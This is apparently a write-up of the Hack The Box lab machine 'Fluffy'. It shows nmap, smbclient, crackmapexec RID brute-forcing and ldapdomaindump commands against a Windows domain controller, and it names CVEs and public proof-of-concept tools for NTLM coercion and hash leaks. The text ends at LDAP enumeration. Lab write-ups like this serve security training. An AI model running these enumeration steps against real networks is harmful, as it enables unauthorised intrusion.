<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Hacking/Write-ups/Hack the box/Machines/Windows/easy/Fluffy" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.1">
<title data-rh="true">Fluffy | agalera.eu</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://www.agalera.eu/docs/write-up/htb/machines/easy/fluffy"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Fluffy | agalera.eu"><meta data-rh="true" name="description" content="As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!"><meta data-rh="true" property="og:description" content="As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!"><link data-rh="true" rel="canonical" href="https://www.agalera.eu/docs/write-up/htb/machines/easy/fluffy"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/write-up/htb/machines/easy/fluffy" hreflang="en"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/write-up/htb/machines/easy/fluffy" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Fluffy","item":"https://www.agalera.eu/docs/write-up/htb/machines/easy/fluffy"}]}</script><link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-S8VGYBN25C"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-S8VGYBN25C",{anonymize_ip:!0})</script><link rel="stylesheet" href="/docs/assets/css/styles.26ac5b64.css">
<script src="/docs/assets/js/runtime~main.ba9568cf.js" defer="defer"></script>
<script src="/docs/assets/js/main.73b52ecc.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><a class="navbar__brand" href="/docs/"><div class="navbar__logo"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">agalera.eu</b></a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search"><span aria-label="expand searchbar" role="button" class="search-icon" tabindex="0"></span><input id="search_input_react" type="search" placeholder="Loading..." aria-label="Search" class="navbar__search-input search-bar" disabled=""></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/flight-sim/dcs/f5e"><span title="Flight Simulators" class="categoryLinkLabel_W154">Flight Simulators</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/docs/Hacking/HTB Academy/Android Fundamentals"><span title="Hacking" class="categoryLinkLabel_W154">Hacking</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/Hacking/HTB Academy/Android Fundamentals"><span title="HTB Academy" class="categoryLinkLabel_W154">HTB Academy</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/languages/bash"><span title="Language security" class="categoryLinkLabel_W154">Language security</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/playbooks/active-directory"><span title="Playbooks" class="categoryLinkLabel_W154">Playbooks</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/tooling/crackmapexec"><span title="Tooling" class="categoryLinkLabel_W154">Tooling</span></a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/useful-links"><span title="Useful links" class="linkLabel_WmDU">Useful links</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/write-up/htb/challenges/critical-ops"><span title="Write-ups" class="categoryLinkLabel_W154">Write-ups</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/write-up/htb/challenges/critical-ops"><span title="Hack the box" class="categoryLinkLabel_W154">Hack the box</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-4 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/write-up/htb/challenges/critical-ops"><span title="Challenges" class="categoryLinkLabel_W154">Challenges</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-4 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/write-up/htb/machines/easy/analytics"><span title="Machines" class="categoryLinkLabel_W154">Machines</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-5 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/write-up/htb/machines/easy/analytics"><span title="Linux" class="categoryLinkLabel_W154">Linux</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-5 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/write-up/htb/machines/easy/fluffy"><span title="Windows" class="categoryLinkLabel_W154">Windows</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-6 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/write-up/htb/machines/easy/fluffy"><span title="easy" class="categoryLinkLabel_W154">easy</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-7 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/write-up/htb/machines/easy/fluffy"><span title="Fluffy" class="linkLabel_WmDU">Fluffy</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-6 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/write-up/htb/machines/medium/manager"><span title="medium" class="categoryLinkLabel_W154">medium</span></a></div></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-4 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/write-up/htb/sherlocks/brutus"><span title="Sherlocks" class="categoryLinkLabel_W154">Sherlocks</span></a></div></li></ul></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/linux-useful-commands"><span title="Linux" class="categoryLinkLabel_W154">Linux</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/Shortcuts/Chrome"><span title="Shortcuts" class="categoryLinkLabel_W154">Shortcuts</span></a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/"><span title="Welcome" class="linkLabel_WmDU">Welcome</span></a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/docs/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Hacking</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Write-ups</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Hack the box</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Machines</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Windows</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">easy</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Fluffy</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Fluffy</h1></header>
<p>As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="enumeration">Enumeration<a href="#enumeration" class="hash-link" aria-label="Direct link to Enumeration" title="Direct link to Enumeration" translate="no">​</a></h2>
<p>We are told this is a Windows box</p>
<p>Normal nmap scan reveals a lot of stuff opened:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">└─$ nmap 10.10.11.69</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 13:13 CEST</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nmap scan report for 10.10.11.69</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host is up (0.034s latency).</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Not shown: 989 filtered tcp ports (no-response)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PORT     STATE SERVICE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">53/tcp   open  domain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">88/tcp   open  kerberos-sec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">139/tcp  open  netbios-ssn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">389/tcp  open  ldap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">445/tcp  open  microsoft-ds</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">464/tcp  open  kpasswd5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">593/tcp  open  http-rpc-epmap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">636/tcp  open  ldapssl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3268/tcp open  globalcatLDAP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3269/tcp open  globalcatLDAPssl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">5985/tcp open  wsman</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds</span><br></span></code></pre></div></div>
<p>Looks like SMB ports are opened, let&#x27;s check what in there:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">└─$ smbclient -L \\10.10.11.69 -N     </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Sharename       Type      Comment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ---------       ----      -------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ADMIN$          Disk      Remote Admin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        C$              Disk      Default share</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        IPC$            IPC       Remote IPC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        IT              Disk      </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        NETLOGON        Disk      Logon server share </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        SYSVOL          Disk      Logon server share </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Reconnecting with SMB1 for workgroup listing.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">do_connect: Connection to 10.10.11.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Unable to connect with SMB1 -- no workgroup available</span><br></span></code></pre></div></div>
<p>In the IT share we see some interesting things:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">└─$ smbclient \\\\10.10.11.69\\IT --user=&quot;j.fleischman&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password for [WORKGROUP\j.fleischman]:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Try &quot;help&quot; to get a list of possible commands.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">smb: \&gt; ls</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  .                                   D        0  Wed Jul 30 17:27:03 2025</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ..                                  D        0  Wed Jul 30 17:27:03 2025</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 17:04:05 2025</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  KeePass-2.58                        D        0  Fri Apr 18 17:08:38 2025</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  KeePass-2.58.zip                    A  3225346  Fri Apr 18 17:03:17 2025</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                5842943 blocks of size 4096. 2236192 blocks available</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">smb: \&gt; pwd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Current directory is \\10.10.11.69\IT\</span><br></span></code></pre></div></div>
<p>Checking the changes from everything.exe shows something promising:</p>
<div class="language-txt codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-txt codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Friday, 20 June 2025: Version 1.4.1.1028</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> fixed a crash when getting help text from a context menu item that throws an exception.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> updated localization.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Friday, 23 May 2025: Version 1.4.1.1027</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> updated localization.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> improved security against dll hijacking.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Thursday, 1 August 2024: Version 1.4.1.1026</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> updated localization.</span><br></span></code></pre></div></div>
<p>Looks like version <code>1.4.1.1026</code> is vulnerable to dll hijacking.</p>
<p>In the SYSVOL, there&#x27;s also an interesting file:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">└─$ smbclient \\\\10.10.11.69\\SYSVOL --user=&quot;j.fleischman&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password for [WORKGROUP\j.fleischman]:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Try &quot;help&quot; to get a list of possible commands.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">smb: \&gt; ls</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  .                                   D        0  Thu Apr 17 17:59:21 2025</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ..                                  D        0  Thu Apr 17 17:59:21 2025</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  fluffy.htb                         Dr        0  Thu Apr 17 17:59:21 2025</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                5842943 blocks of size 4096. 2236145 blocks available</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">smb: \&gt;</span><br></span></code></pre></div></div>
<p>This looks like some Active Directory policies or something similar. According to <a href="https://blog.netwrix.com/2017/01/30/sysvol-directory/" target="_blank" rel="noopener noreferrer">https://blog.netwrix.com/2017/01/30/sysvol-directory</a></p>
<blockquote>
<p>The system volume (SYSVOL) is a special directory on each DC. It is made up of several folders with one being shared and referred to as the SYSVOL share.</p>
</blockquote>
<p>We&#x27;ll now exfiliate the files from the samba share to our computer to analyze them.</p>
<p>The PDF warns the sysadm to patch the system to mitigate the impact of the following CVEs:</p>
<p>CVE-2025-24996 - Critical</p>
<p>Looks like this vulnerability allows a user to trick NTLM into connect as another user. There&#x27;s no POC available, however, ChatGPT suggest to use <a href="https://github.com/p0dalirius/Coercer" target="_blank" rel="noopener noreferrer">https://github.com/p0dalirius/Coercer</a> to check if we&#x27;re lucky.</p>
<p>CVE-2025-24071 - Critical</p>
<p>Looks like there&#x27;s a poc for CVE-2025-24071: <a href="https://github.com/DeshanFer94/CVE-2025-24071-POC-NTLMHashDisclosure-" target="_blank" rel="noopener noreferrer">https://github.com/DeshanFer94/CVE-2025-24071-POC-NTLMHashDisclosure-</a>. The idea is the attacker will try to perform smb auth and the vulnerability will leak the NTLMv2 hash of the user, since we have a bunch of users, we can try to guess the password from the leaked hashes.</p>
<p>CVE-2025-46785 - High</p>
<p>Related with a Buffer overflow in Zoom Workplace application. Maybe to be used for privilege escalation?</p>
<p>CVE-2025-29968 - High</p>
<p>Looks like denial of service vulnerability</p>
<p>CVE-2025-21193 - Medium</p>
<p>Spoofing in Active Directory, might be interesting</p>
<p>CVE-2025-3445  - Low</p>
<p>Relates to mholt/archiver golang</p>
<p>Most likely one of these vulnerabilities will be useful to us</p>
<p>The networks shares contain some zip files containing some exe files. Maybe there are useful somehow?</p>
<div class="language-txt codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-txt codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">- everything-1.4.1.exe: https://www.voidtools.com/faq/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- kepass-2.58.exe: https://keepass.info/news/n250709_2.59.html</span><br></span></code></pre></div></div>
<p>We can enumerate all the users in the machine with <code>crackmapexec</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">crackmapexec smb fluffy.htb -u anonymous -p &quot;&quot; --rid-brute 10000 &gt; users     </span><br></span></code></pre></div></div>
<p>And discard garbage data:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat users|grep -i user |rev |cut -f2 -d &#x27; &#x27; |rev |grep FLUFFY |cut -f2 -d &#x27;\&#x27; |grep -Ev (DC|SVC) |tail -n +4 &gt; users.txt</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ldap-enumeration">LDAP enumeration<a href="#ldap-enumeration" class="hash-link" aria-label="Direct link to LDAP enumeration" title="Direct link to LDAP enumeration" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ldapdomaindump fluffy.htb -u &#x27;fluffy.htb\j.fleischman&#x27; -p &#x27;J0elTHEM4n1990!&#x27; --no-json --no-grep</span><br></span></code></pre></div></div>
